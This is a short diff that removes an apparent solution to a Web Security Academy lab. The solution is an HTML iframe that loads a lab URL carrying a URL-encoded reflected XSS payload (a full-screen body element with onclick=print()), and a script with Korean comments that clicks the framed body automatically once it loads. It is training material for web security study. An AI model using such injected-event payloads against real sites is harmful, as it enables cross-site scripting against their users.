@@ -1,8 +1,0 @@
-<iframe src="https://[너의-랩-고유-ID].web-security-academy.net/?search=%3Cbody+onclick%3Dprint%28%29+style%3D%22width%3A100vw%3Bheight%3A100vh%3Bposition%3Aabsolute%3Bleft%3A0%3Btop%3A0%3B%22%3E" id="hack"></iframe>
-
-<script>
-    // iframe(액자)이 로드 완료되면 내부의 body를 강제로 클릭!
-    document.getElementById('hack').addEventListener('load', function() {
-        this.contentWindow.document.body.click();
-    });
-</script>
